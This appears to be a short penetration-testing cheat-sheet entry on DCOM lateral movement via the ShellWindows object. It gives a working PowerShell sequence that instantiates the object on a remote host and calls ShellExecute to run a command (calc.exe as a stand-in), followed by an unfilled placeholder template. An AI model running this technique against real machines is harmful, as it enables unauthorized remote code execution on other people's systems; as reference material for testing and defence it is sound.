## SHELLWINDOWS

### What it does:
- TL;DR Yet another .Net command execution

PORT TCP 135 (RPCPortmapper) + Random high number port (DCOM)

AUTH Only specified authorized users

TOOLS PowerShell, direct .NET calls

SIGNATURES MEOW

EX. COMMAND PS> $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-
00A0C90A8F39',"192.168.112.200")

PS> $obj = [System.Activator]::CreateInstance($com)

PS> $item = $obj.Item()

PS> $item.Document.Application.ShellExecute("cmd.exe","/c
calc.exe","c:\windows\system32",$null,0)

### Command:
- **Command**: `command_here`
- **Port**: `port_here`
- **Tool**: `tool_here`

### Signatures:
- Signature details or indicators.

### Example of the command in use:
```bash
# Example of how to use the command
command_here -option value
```
